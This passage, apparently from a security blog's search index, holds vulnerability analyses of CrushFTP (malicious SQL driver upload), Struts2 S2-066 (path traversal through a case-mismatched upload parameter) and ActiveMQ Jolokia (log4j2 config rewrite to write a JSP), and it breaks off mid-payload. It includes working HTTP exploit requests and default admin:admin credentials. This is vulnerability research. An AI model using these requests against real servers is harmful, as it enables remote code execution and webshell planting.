type=&quot;properties&quot;&gt;&lt;name&gt;Y4TMP&lt;/name&gt;&lt;path&gt;/&lt;/path&gt;&lt;vfs_item type=&quot;vector&quot;&gt;&lt;vfs_item_subitem type=&quot;properties&quot;&gt;&lt;type&gt;DIR&lt;/type&gt;&lt;url&gt;&lt;/url&gt;&lt;/vfs_item_subitem&gt;&lt;/vfs_item&gt;&lt;/vfs_items_subitem&gt;&lt;vfs_items_subitem type=&quot;properties&quot;&gt;&lt;name&gt;tmp&lt;/name&gt;&lt;path&gt;/Y4TMP/&lt;/path&gt;&lt;vfs_item type=&quot;vector&quot;&gt;&lt;vfs_item_subitem type=&quot;properties&quot;&gt;&lt;type&gt;DIR&lt;/type&gt;&lt;url&gt;FILE://Volumes/Macintosh HD/tmp/&lt;/url&gt;&lt;/vfs_item_subitem&gt;&lt;/vfs_item&gt;&lt;/vfs_items_subitem&gt;&lt;/vfs_items&gt;permissions: &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;VFS type=&quot;properties&quot;&gt;&lt;item name=&quot;/&quot;&gt;(read)(view)(resume)&lt;/item&gt;&lt;item name=&quot;/Y4TMP/&quot;&gt;(read)(view)(resume)&lt;/item&gt;&lt;item name=&quot;/Y4TMP/TMP/&quot;&gt;(read)(write)(view)(delete)(deletedir)(makedir)(rename)(resume)(share)&lt;/item&gt;&lt;/VFS&gt;c2f: kYjk 之后在主页上传jar包 抓了个包发现这样非常麻烦，需要两步，第一步相当于初始化，第二步还要计算文件大小拼接(19218是文件大小) 通过阅读源码我发现了一个可替代的步骤，并且更简单，简化我们做自动化利用的步骤 现在既然成功上传了，那就可以控制参数加载我们的恶意SQL驱动程序执行任意命令","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"CrushFTP","slug":"CrushFTP","permalink":"https://y4tacker.github.io/tags/CrushFTP/"}]},{"title":"Apache Struts2 文件上传分析(S2-066)","slug":"year/2023/12/Apache-Struts2-文件上传分析-S2-066","date":"2023-12-09T10:55:03.000Z","updated":"2024-08-04T09:01:49.778Z","comments":true,"path":"2023/12/09/year/2023/12/Apache-Struts2-文件上传分析-S2-066/","link":"","permalink":"https://y4tacker.github.io/2023/12/09/year/2023/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90-S2-066/","excerpt":"","text":"Apache Struts2 文件上传分析(S2-066)struts2也很久没出过漏洞了吧，这次爆的是和文件上传相关 相关的commit在https://github.com/apache/struts/commit/162e29fee9136f4bfd9b2376da2cbf590f9ea163 首先从commit可以看出，漏洞和大小写参数有关，后面会具体谈及 同时结合CVE描述我们可以知道，大概和路径穿越有关 1An attacker can manipulate file upload params to enable paths traversal and under some circumstances this can lead to uploading a malicious file which can be used to perform Remote Code Execution. Users are recommended to upgrade to versions Struts 2.5.33 or Struts 6.3.0.2 or greater to fix this issue. 环境这里我以6.3.0为例搭建 12345&lt;dependency&gt; &lt;groupId&gt;org.apache.struts&lt;/groupId&gt; &lt;artifactId&gt;struts2-core&lt;/artifactId&gt; &lt;version&gt;6.3.0&lt;/version&gt;&lt;/dependency&gt; 定义一个UploadAction 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758package com.struts2;import com.opensymphony.xwork2.ActionSupport;import org.apache.commons.io.FileUtils;import org.apache.struts2.ServletActionContext;import java.io.*;public class UploadAction extends ActionSupport &#123; private static final long serialVersionUID = 1L; private File upload; // 文件类型，为name属性值 + ContentType private String uploadContentType; // 文件名称，为name属性值 + FileName private String uploadFileName; public File getUpload() &#123; return upload; &#125; public void setUpload(File upload) &#123; this.upload = upload; &#125; public String getUploadContentType() &#123; return uploadContentType; &#125; public void setUploadContentType(String uploadContentType) &#123; this.uploadContentType = uploadContentType; &#125; public String getUploadFileName() &#123; return uploadFileName; &#125; public void setUploadFileName(String uploadFileName) &#123; this.uploadFileName = uploadFileName; &#125; public String doUpload() &#123; String path = ServletActionContext.getServletContext().getRealPath(&quot;/&quot;)+&quot;upload&quot;; String realPath = path + File.separator +uploadFileName; try &#123; FileUtils.copyFile(upload, new File(realPath)); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; return SUCCESS; &#125;&#125; 在struts.xml当中，通常默认配置下这个文件在项目路径的/WEB-INF/classes路径下 123456789101112&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE struts PUBLIC &quot;-//Apache Software Foundation//DTD Struts Configuration 2.0//EN&quot; &quot;http://struts.apache.org/dtds/struts-2.0.dtd&quot;&gt;&lt;struts&gt; &lt;package name=&quot;upload&quot; extends=&quot;struts-default&quot;&gt; &lt;action name=&quot;upload&quot; class=&quot;com.struts2.UploadAction&quot; method=&quot;doUpload&quot;&gt; &lt;result name=&quot;success&quot; type=&quot;&quot;&gt;/index.jsp&lt;/result&gt; &lt;/action&gt; &lt;/package&gt;&lt;/struts&gt; 以及在web.xml当中配置好filter 12345678&lt;filter&gt; &lt;filter-name&gt;struts2&lt;/filter-name&gt; &lt;filter-class&gt;org.apache.struts2.dispatcher.filter.StrutsPrepareAndExecuteFilter&lt;/filter-class&gt;&lt;/filter&gt;&lt;filter-mapping&gt; &lt;filter-name&gt;struts2&lt;/filter-name&gt; &lt;url-pattern&gt;*.action&lt;/url-pattern&gt;&lt;/filter-mapping&gt; 分析从文件上传的Action也可以看出，struts2当中，文件上传的过程主要涉及到两个重要参数，以我的环境命名为例upload以及uploadFileName 上面描述可知此漏洞为路径穿越，而我们知道Struts2本身是有一系列默认拦截器，这部分配置在struts-default.xml中，其中就包含了一个与文件上传相关的拦截器org.apache.struts2.interceptor.FileUploadInterceptor 我们先来测试一下文件上传 123456789101112131415POST /upload.action HTTP/1.1Host: 127.0.0.1Accept: */*Accept-Encoding: gzip, deflateContent-Length: 188Content-Type: multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWNUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWNContent-Disposition: form-data; name=&quot;Upload&quot;; filename=&quot;../1.txt&quot;Content-Type: text/plain1aaa--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN-- 发现落地的文件名字变成了1.txt 我们简单来做个debug，看看文件上传的处理流程 首先在org.apache.struts2.interceptor.FileUploadInterceptor#intercept中 获取文件名通过multiWrapper.getFileNames做处理 最终是由org.apache.struts2.dispatcher.multipart.AbstractMultiPartRequest#getCanonicalName做文件名处理，以下是部分调试栈，有兴趣的可以自行debug 1234getCanonicalName:162, AbstractMultiPartRequest (org.apache.struts2.dispatcher.multipart)getFileNames:265, JakartaMultiPartRequest (org.apache.struts2.dispatcher.multipart)getFileNames:159, MultiPartRequestWrapper (org.apache.struts2.dispatcher.multipart)intercept:279, FileUploadInterceptor (org.apache.struts2.interceptor) 这部分代码很直白，拦截了路径穿越 123456789101112protected String getCanonicalName(final String originalFileName) &#123; String fileName = originalFileName; int forwardSlash = fileName.lastIndexOf(&#x27;/&#x27;); int backwardSlash = fileName.lastIndexOf(&#x27;\\\\&#x27;); if (forwardSlash != -1 &amp;&amp; forwardSlash &gt; backwardSlash) &#123; fileName = fileName.substring(forwardSlash + 1); &#125; else &#123; fileName = fileName.substring(backwardSlash + 1); &#125; return fileName; &#125; 继续回到FileUploadInterceptor当中，处理完文件后，会把一些信息保存到acceptedFiles/acceptedContentTypes/acceptedFileNames中，从下面的fileNameName也可以看出为什么我们的Action一定要那样命名上传的文件名 再往下将这些参数保存到了org.apache.struts2.dispatcher.HttpParameters对象当中 既然是保存到了HttpParameter参数中，结合Commit当中的一些讯息，接下来我们很容易有个思考，既然是HttpParameter，是不是存在其他传参的过程能够做变量覆盖 从上面的图片做深入分析,我们可以知道ac.getParameters()获取到的HttpParameter对象是从上下文获取的 上下文的创建在org.apache.struts2.dispatcher.Dispatcher#serviceAction 在创建上下文的过程当中我们发现，调用了HttpParameters.create将请求的参数保存到了当中 看到这里其实我们也就可以知道大概思路了，参数的保存既然在FileUploadInterceptor之前，那么变量覆盖就不存在了(存储结构为Map，key唯一)，结合到commit当中的一些大小写，此时我们不难猜到如果我们将上传的文件名小写，那会不会在将参数绑定到Action对象的过程当中 而这部分处理过程就在com.opensymphony.xwork2.interceptor.ParametersInterceptor#doIntercept 里面调用了com.opensymphony.xwork2.interceptor.ParametersInterceptor#setParameters做参数绑定，这个过程老生常谈了，不懂得可以去百度了解了解这里不多谈了 当然这里还是需要多说一点，这个方法的调用是有顺序的，这和Map的存储结构有关 这里可以看到是Treemap 可以看到大写的会优先(Map结构) 踩坑我第一次打的时候把最后一位大写了，但是发现没有调用到set方法 12345678910111213141516171819POST /upload.action HTTP/1.1Host: 127.0.0.1Accept: */*Content-Length: 188Content-Type: multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWNUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWNContent-Disposition: form-data; name=&quot;Upload&quot;; filename=&quot;1.txt&quot;Content-Type: text/plain1aaa--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWNContent-Disposition: form-data; name=&quot;UPloadFileName&quot;; Content-Type: text/plain1323.jsp--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN-- 经过debug可以发现在ognl.OgnlRuntime#_getSetMethod获取setter方法时调用了ognl.OgnlRuntime#getDeclaredMethods做处理 省略垃圾时间吧，最终在ognl.OgnlRuntime#addIfAccessor，可以看到必须满足ms.endsWith(baseName)(这点很关键，也就是说你的Action的程序代码怎么写影响你怎么写参数) 12345678910111213141516private static void addIfAccessor(List result, Method method, String baseName, boolean findSets) &#123; final String ms = method.getName(); if (ms.endsWith(baseName)) &#123; boolean isSet = false, isIs = false; if ((isSet = ms.startsWith(SET_PREFIX)) || ms.startsWith(GET_PREFIX) || (isIs = ms.startsWith(IS_PREFIX))) &#123; int prefixLength = (isIs ? 2 : 3); if (isSet == findSets) &#123; if (baseName.length() == (ms.length() - prefixLength)) &#123; result.add(method); &#125; &#125; &#125; &#125; &#125; 1234567891011121314151617181920212223部分调用栈如下addIfAccessor:2701, OgnlRuntime (ognl)collectAccessors:2686, OgnlRuntime (ognl)getDeclaredMethods:2653, OgnlRuntime (ognl)_getSetMethod:2915, OgnlRuntime (ognl)getSetMethod:2884, OgnlRuntime (ognl)hasSetMethod:2955, OgnlRuntime (ognl)hasSetProperty:2973, OgnlRuntime (ognl)setProperty:83, CompoundRootAccessor (com.opensymphony.xwork2.ognl.accessor)setProperty:3359, OgnlRuntime (ognl)setValueBody:134, ASTProperty (ognl)evaluateSetValueBody:220, SimpleNode (ognl)setValue:308, SimpleNode (ognl)setValue:829, Ognl (ognl)lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)execute:-1, 102405086 (com.opensymphony.xwork2.ognl.OgnlUtil$$Lambda$53)compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)setValue:543, OgnlUtil (com.opensymphony.xwork2.ognl)trySetValue:195, OgnlValueStack (com.opensymphony.xwork2.ognl)setValue:182, OgnlValueStack (com.opensymphony.xwork2.ognl)setParameter:166, OgnlValueStack (com.opensymphony.xwork2.ognl)setParameters:228, ParametersInterceptor (com.opensymphony.xwork2.interceptor).... 而baseName其实也是有做了处理的(必须看)，回到之前的getDeclaredMethods方法，我们的属性名会被capitalizeBeanPropertyName处理 做了很多分支判断，可以看到特殊支持了一些特殊方法的调用，但是其实前面的几个不能用，因为他们后面多了一些字符()，在之前提到的endwith是不包括这些符号的 123456789101112131415161718192021222324252627282930private static String capitalizeBeanPropertyName(String propertyName) &#123; if (propertyName.length() == 1) &#123; return propertyName.toUpperCase(); &#125; // don&#x27;t capitalize getters/setters if (propertyName.startsWith(GET_PREFIX) &amp;&amp; propertyName.endsWith(&quot;()&quot;)) &#123; if (Character.isUpperCase(propertyName.substring(3,4).charAt(0))) &#123; return propertyName; &#125; &#125; if (propertyName.startsWith(SET_PREFIX) &amp;&amp; propertyName.endsWith(&quot;)&quot;)) &#123; if (Character.isUpperCase(propertyName.substring(3,4).charAt(0))) &#123; return propertyName; &#125; &#125; if (propertyName.startsWith(IS_PREFIX) &amp;&amp; propertyName.endsWith(&quot;()&quot;)) &#123; if (Character.isUpperCase(propertyName.substring(2,3).charAt(0))) &#123; return propertyName; &#125; &#125; char first = propertyName.charAt(0); char second = propertyName.charAt(1); if (Character.isLowerCase(first) &amp;&amp; Character.isUpperCase(second)) &#123; return propertyName; &#125; else &#123; char[] chars = propertyName.toCharArray(); chars[0] = Character.toUpperCase(chars[0]); return new String(chars); &#125; &#125; 我们主要关注下面的部分，如果属性第一个字符小写第二个大写直接返回，否则返回时将第一个字母大写 123456789char first = propertyName.charAt(0);char second = propertyName.charAt(1);if (Character.isLowerCase(first) &amp;&amp; Character.isUpperCase(second)) &#123; return propertyName;&#125; else &#123; char[] chars = propertyName.toCharArray(); chars[0] = Character.toUpperCase(chars[0]); return new String(chars);&#125; 在这里的例子当中我们需要调用com.struts2.UploadAction#setUploadFileName 因此也只能限制了我们的写法要么是UploadFileName要么是uploadFileName(前面提到的endwith+capitalizeBeanPropertyName处理) 最终构造按照Map存储的调用顺序我们即可构造 1234567891011--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWNContent-Disposition: form-data; name=&quot;Upload&quot;; filename=&quot;1.txt&quot;Content-Type: text/plain1aaa--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWNContent-Disposition: form-data; name=&quot;uploadFileName&quot;; Content-Type: text/plain../123.jsp--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN-- 或者 123456789101112131415POST /upload.action?uploadFileName=../1234.jsp HTTP/1.1Host: 127.0.0.1Accept: */*Accept-Encoding: gzip, deflateContent-Length: 188Content-Type: multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWNUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWNContent-Disposition: form-data; name=&quot;Upload&quot;; filename=&quot;1.txt&quot;Content-Type: text/plain1aaa--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN--","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Struts2","slug":"Struts2","permalink":"https://y4tacker.github.io/tags/Struts2/"}]},{"title":"Apache ActiveMQ Jolokia远程代码执行不依赖JDK打法","slug":"year/2023/11/某系统最新前台RCE分析/Apache-ActiveMQ-Jolokia远程代码执行不依赖JDK打法","date":"2023-11-30T12:20:15.000Z","updated":"2024-08-04T09:01:49.741Z","comments":true,"path":"2023/11/30/year/2023/11/某系统最新前台RCE分析/Apache-ActiveMQ-Jolokia远程代码执行不依赖JDK打法/","link":"","permalink":"https://y4tacker.github.io/2023/11/30/year/2023/11/%E6%9F%90%E7%B3%BB%E7%BB%9F%E6%9C%80%E6%96%B0%E5%89%8D%E5%8F%B0RCE%E5%88%86%E6%9E%90/Apache-ActiveMQ-Jolokia%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8D%E4%BE%9D%E8%B5%96JDK%E6%89%93%E6%B3%95/","excerpt":"","text":"Apache ActiveMQ Jolokia远程代码执行不依赖JDK打法想着最近连写了几篇加密博客有点对不起看我博客的粉丝了，今天抽空简单分享一个姿势 影响版本大概测了一下 Apache ActiveMQ 5.16.x系列无log4j2的mbean Apache ActiveMQ 5.17.x系列漏洞版本受影响 初探从网上已公开的打法可以知道使用jdk.management.jfr:type=FlightRecorder受jdk版本的影响，那有没有其他方法呢？答案肯定是有，从commit点我可以看出禁用的mbean不仅有jdk.management.jfr:type=FlightRecorder,还有com.sun.management:type=DiagnosticCommand以及org.apache.logging.log4j2:*,对于DiagnosticCommand的利用在之前很早就有公开，链接在https://github.com/laluka/jolokia-exploitation-toolkit/blob/main/exploits/file-write-to-rce-vhost-jfr.md，不过大概看了一下这里似乎不太行(也没仔细看就是了)，比较感兴趣的是这个log4j2的利用 在http://127.0.0.1:8161/api/jolokia/list当中搜索可以看到如下，利用的时候`type=63a65a25`似乎不是固定的，看起来大概和版本有关，需要先访问这个路由看看 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154&quot;org.apache.logging.log4j2&quot;: &#123; &quot;component=StatusLogger,type=63a65a25&quot;: &#123; &quot;attr&quot;: &#123; &quot;StatusDataHistory&quot;: &#123; &quot;rw&quot;: false, &quot;type&quot;: &quot;[Ljava.lang.String;&quot;, &quot;desc&quot;: &quot;Attribute exposed for management&quot; &#125;, &quot;Level&quot;: &#123; &quot;rw&quot;: true, &quot;type&quot;: &quot;java.lang.String&quot;, &quot;desc&quot;: &quot;Attribute exposed for management&quot; &#125;, &quot;StatusData&quot;: &#123; &quot;rw&quot;: false, &quot;type&quot;: &quot;java.util.List&quot;, &quot;desc&quot;: &quot;Attribute exposed for management&quot; &#125;, &quot;ObjectName&quot;: &#123; &quot;rw&quot;: false, &quot;type&quot;: &quot;javax.management.ObjectName&quot;, &quot;desc&quot;: &quot;Attribute exposed for management&quot; &#125;, &quot;ContextName&quot;: &#123; &quot;rw&quot;: false, &quot;type&quot;: &quot;java.lang.String&quot;, &quot;desc&quot;: &quot;Attribute exposed for management&quot; &#125; &#125;, &quot;class&quot;: &quot;org.apache.logging.log4j.core.jmx.StatusLoggerAdmin&quot;, &quot;desc&quot;: &quot;Information on the management interface of the MBean&quot; &#125;, &quot;component=Loggers,name=,type=63a65a25&quot;: &#123; &quot;attr&quot;: &#123; &quot;Additive&quot;: &#123; &quot;rw&quot;: true, &quot;type&quot;: &quot;boolean&quot;, &quot;desc&quot;: &quot;Attribute exposed for management&quot; &#125;, &quot;Filter&quot;: &#123; &quot;rw&quot;: false, &quot;type&quot;: &quot;java.lang.String&quot;, &quot;desc&quot;: &quot;Attribute exposed for management&quot; &#125;, &quot;AppenderRefs&quot;: &#123; &quot;rw&quot;: false, &quot;type&quot;: &quot;[Ljava.lang.String;&quot;, &quot;desc&quot;: &quot;Attribute exposed for management&quot; &#125;, &quot;IncludeLocation&quot;: &#123; &quot;rw&quot;: false, &quot;type&quot;: &quot;boolean&quot;, &quot;desc&quot;: &quot;Attribute exposed for management&quot; &#125;, &quot;Level&quot;: &#123; &quot;rw&quot;: true, &quot;type&quot;: &quot;java.lang.String&quot;, &quot;desc&quot;: &quot;Attribute exposed for management&quot; &#125;, &quot;Name&quot;: &#123; &quot;rw&quot;: false, &quot;type&quot;: &quot;java.lang.String&quot;, &quot;desc&quot;: &quot;Attribute exposed for management&quot; &#125; &#125;, &quot;class&quot;: &quot;org.apache.logging.log4j.core.jmx.LoggerConfigAdmin&quot;, &quot;desc&quot;: &quot;Information on the management interface of the MBean&quot; &#125;, &quot;type=63a65a25&quot;: &#123; &quot;op&quot;: &#123; &quot;setConfigText&quot;: &#123; &quot;args&quot;: [&#123; &quot;name&quot;: &quot;p1&quot;, &quot;type&quot;: &quot;java.lang.String&quot;, &quot;desc&quot;: &quot;&quot; &#125;, &#123; &quot;name&quot;: &quot;p2&quot;, &quot;type&quot;: &quot;java.lang.String&quot;, &quot;desc&quot;: &quot;&quot; &#125;], &quot;ret&quot;: &quot;void&quot;, &quot;desc&quot;: &quot;Operation exposed for management&quot; &#125;, &quot;getConfigText&quot;: &#123; &quot;args&quot;: [&#123; &quot;name&quot;: &quot;p1&quot;, &quot;type&quot;: &quot;java.lang.String&quot;, &quot;desc&quot;: &quot;&quot; &#125;], &quot;ret&quot;: &quot;java.lang.String&quot;, &quot;desc&quot;: &quot;Operation exposed for management&quot; &#125; &#125;, &quot;attr&quot;: &#123; &quot;Status&quot;: &#123; &quot;rw&quot;: false, &quot;type&quot;: &quot;java.lang.String&quot;, &quot;desc&quot;: &quot;Attribute exposed for management&quot; &#125;, &quot;ConfigClassName&quot;: &#123; &quot;rw&quot;: false, &quot;type&quot;: &quot;java.lang.String&quot;, &quot;desc&quot;: &quot;Attribute exposed for management&quot; &#125;, &quot;ConfigLocationUri&quot;: &#123; &quot;rw&quot;: true, &quot;type&quot;: &quot;java.lang.String&quot;, &quot;desc&quot;: &quot;Attribute exposed for management&quot; &#125;, &quot;ConfigName&quot;: &#123; &quot;rw&quot;: false, &quot;type&quot;: &quot;java.lang.String&quot;, &quot;desc&quot;: &quot;Attribute exposed for management&quot; &#125;, &quot;ConfigProperties&quot;: &#123; &quot;rw&quot;: false, &quot;type&quot;: &quot;java.util.Map&quot;, &quot;desc&quot;: &quot;Attribute exposed for management&quot; &#125;, &quot;ConfigText&quot;: &#123; &quot;rw&quot;: false, &quot;type&quot;: &quot;java.lang.String&quot;, &quot;desc&quot;: &quot;Attribute exposed for management&quot; &#125;, &quot;Name&quot;: &#123; &quot;rw&quot;: false, &quot;type&quot;: &quot;java.lang.String&quot;, &quot;desc&quot;: &quot;Attribute exposed for management&quot; &#125;, &quot;ObjectName&quot;: &#123; &quot;rw&quot;: false, &quot;type&quot;: &quot;javax.management.ObjectName&quot;, &quot;desc&quot;: &quot;Attribute exposed for management&quot; &#125;, &quot;ConfigFilter&quot;: &#123; &quot;rw&quot;: false, &quot;type&quot;: &quot;java.lang.String&quot;, &quot;desc&quot;: &quot;Attribute exposed for management&quot; &#125; &#125;, &quot;class&quot;: &quot;org.apache.logging.log4j.core.jmx.LoggerContextAdmin&quot;, &quot;desc&quot;: &quot;Information on the management interface of the MBean&quot; &#125;, &quot;component=ContextSelector,type=63a65a25&quot;: &#123; &quot;attr&quot;: &#123; &quot;ImplementationClassName&quot;: &#123; &quot;rw&quot;: false, &quot;type&quot;: &quot;java.lang.String&quot;, &quot;desc&quot;: &quot;Attribute exposed for management&quot; &#125; &#125;, &quot;class&quot;: &quot;org.apache.logging.log4j.core.jmx.ContextSelectorAdmin&quot;, &quot;desc&quot;: &quot;Information on the management interface of the MBean&quot; &#125;, 在这里可以看到两个比较可疑的操作setConfigText与getConfigText,看起来似乎与配置相关 看看代码可以发现，确实根据我们传入的字符串做了配置文件解析更新 同时getConfigText可以查看当前环境下的配置，可以看到返回的形式就和文件/conf/log4j2.properties一致 12345678910111213141516171819POST /api/jolokia/ HTTP/1.1Host: 127.0.0.1:8161Authorization: Basic YWRtaW46YWRtaW4=User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36Origin: 127.0.0.1Connection: closeContent-Type: application/jsonContent-Length: 2174&#123; &quot;type&quot;: &quot;EXEC&quot;, &quot;mbean&quot;: &quot;org.apache.logging.log4j2:type=63a65a25&quot;, &quot;operation&quot;: &quot;getConfigText&quot;, &quot;arguments&quot;:[&quot;UTF-8&quot;] &#125;response:&#123;&quot;request&quot;:&#123;&quot;mbean&quot;:&quot;org.apache.logging.log4j2:type=63a65a25&quot;,&quot;arguments&quot;:[&quot;UTF-8&quot;],&quot;type&quot;:&quot;exec&quot;,&quot;operation&quot;:&quot;getConfigText&quot;&#125;,&quot;value&quot;:&quot;rootLogger.level=INFO\\nrootLogger.appenderRef.console.ref=Console\\nrootLogger.appenderRef.console.filter.threshold.type=ThresholdFilter\\nrootLogger.appenderRef.console.filter.threshold.level=INFO\\nrootLogger.appenderRef.logfile.ref=RollingFile\\nlogger.spring.name=org.apache.activemq.spring\\nlogger.spring.level=WARN\\nlogger.web.name=org.apache.activemq.web.handler\\nlogger.web.level=WARN\\nlogger.springframework.name=org.springframework\\nlogger.springframework.level=WARN\\nlogger.xbean.name=org.apache.xbean\\nlogger.xbean.level=WARN\\n\\n# Jetty\\nlogger.jetty.name=org.eclipse.jetty\\nlogger.jetty.level=WARN\\n\\n# ActiveMQ\\n#log4j2.logger.activemq.name=org.apache.activemq\\n#log4j2.logger.activemq.level=DEBUG\\n\\n# Appender configuration\\n\\n# Console appender\\nappender.console.type=Console\\nappender.console.name=Console\\nappender.console.layout.type=PatternLayout\\nappender.console.layout.pattern=%5p | %m%n\\n\\n# File appender\\nappender.logfile.type=RollingRandomAccessFile\\nappender.logfile.name=RollingFile\\nappender.logfile.fileName=$&#123;sys:activemq.data&#125;\\/activemq2.log\\nappender.logfile.filePattern=$&#123;sys:activemq.data&#125;\\/activemq2.log.%i\\nappender.logfile.append=true\\nappender.logfile.layout.type=PatternLayout\\nappender.logfile.layout.pattern=%d | %-5p | %m | %c | %t%n%throwable&#123;full&#125;\\nappender.logfile.policies.type=Policies\\nappender.logfile.policies.size.type=SizeBasedTriggeringPolicy\\nappender.logfile.policies.size.size=1MB\\n\\n\\nlogger.audit.name=org.apache.activemq.audit\\nlogger.audit.additivity=false\\nlogger.audit.level=INFO\\nlogger.audit.appenderRef.auditlog.ref=AuditLog\\n\\nappender.auditlog.type=RollingRandomAccessFile\\nappender.auditlog.name=AuditLog\\nappender.auditlog.fileName=$&#123;sys:activemq.data&#125;\\/audit.log\\nappender.auditlog.filePattern=$&#123;sys:activemq.data&#125;\\/audit.log.%i\\nappender.auditlog.append=true\\nappender.auditlog.layout.type=PatternLayout\\nappender.auditlog.layout.pattern=%-5p | %m | %t%n\\nappender.auditlog.policies.type=Policies\\nappender.auditlog.policies.size.type=SizeBasedTriggeringPolicy\\nappender.auditlog.policies.size.size=1MB\\n&quot;,&quot;timestamp&quot;:1701347796,&quot;status&quot;:200&#125; 踩坑但是当我们按照这个格式改好payload调用set更新时发现并没有成功，无事发生 调试后才发现这个config解析其实是xml形式的，算是被系统坑了一把 调用栈(方便也想调试看看的师傅) 1234567891011121314151617181920setConfiguration:601, LoggerContext (org.apache.logging.log4j.core)start:285, LoggerContext (org.apache.logging.log4j.core)setConfigText:201, LoggerContextAdmin (org.apache.logging.log4j.core.jmx)invoke0:-1, NativeMethodAccessorImpl (jdk.internal.reflect)invoke:62, NativeMethodAccessorImpl (jdk.internal.reflect)invoke:43, DelegatingMethodAccessorImpl (jdk.internal.reflect)invoke:566, Method (java.lang.reflect)invoke:71, Trampoline (sun.reflect.misc)invoke0:-1, NativeMethodAccessorImpl (jdk.internal.reflect)invoke:62, NativeMethodAccessorImpl (jdk.internal.reflect)invoke:43, DelegatingMethodAccessorImpl (jdk.internal.reflect)invoke:566, Method (java.lang.reflect)invoke:260, MethodUtil (sun.reflect.misc)invokeM2:112, StandardMBeanIntrospector (com.sun.jmx.mbeanserver)invokeM2:46, StandardMBeanIntrospector (com.sun.jmx.mbeanserver)invokeM:237, MBeanIntrospector (com.sun.jmx.mbeanserver)invoke:138, PerInterface (com.sun.jmx.mbeanserver)invoke:252, MBeanSupport (com.sun.jmx.mbeanserver)invoke:809, DefaultMBeanServerInterceptor (com.sun.jmx.interceptor)invoke:801, JmxMBeanServer (com.sun.jmx.mbeanserver) 破局但是也知道我懒，这种格式转换的活我很烦，还好有chatGPT，简单问了一手解决了我的问题 毕竟我不关心内容只需要一个模板罢了 12345678910111213141516171819202122把接下来我给的配置转化为log4j2配置的xml的形式好的喵xxxx以下是将您提供的配置转换为log4j2的XML形式：&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;Configuration status=&quot;WARN&quot;&gt; &lt;Appenders&gt; &lt;Console name=&quot;Console&quot; target=&quot;SYSTEM_OUT&quot;&gt; &lt;PatternLayout pattern=&quot;%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%t] %-5level %logger&#123;36&#125; - %msg%n&quot;/&gt; &lt;/Console&gt; &lt;File name=&quot;File&quot; fileName=&quot;logs/logfile.log&quot;&gt; &lt;PatternLayout pattern=&quot;%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%t] %-5level %logger&#123;36&#125; - %msg%n&quot;/&gt; &lt;/File&gt; &lt;/Appenders&gt; &lt;Loggers&gt; &lt;Root level=&quot;debug&quot;&gt; &lt;AppenderRef ref=&quot;Console&quot;/&gt; &lt;AppenderRef ref=&quot;File&quot;/&gt; &lt;/Root&gt; &lt;/Loggers&gt;&lt;/Configuration&gt; 虽然不知道绝对路径，但是根据系统的原配置文件的写法appender.logfile.fileName=$&#123;sys:activemq.data&#125;/activemq.log再结合日志路径可以猜到使用$&#123;sys:activemq.data&#125;/../webapps/admin/ 同时为了方便利用，我写成el表达式的形式 1234567891011121314151617&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;Configuration status=&quot;WARN&quot;&gt; &lt;Appenders&gt; &lt;RollingRandomAccessFile name=&quot;RollingFile&quot; fileName=&quot;$&#123;sys:activemq.data&#125;/../webapps/admin/y4test.jsp&quot; filePattern=&quot;$&#123;sys:activemq.data&#125;/../webapps/admin/y4test.jsp&quot;&gt; &lt;PatternLayout 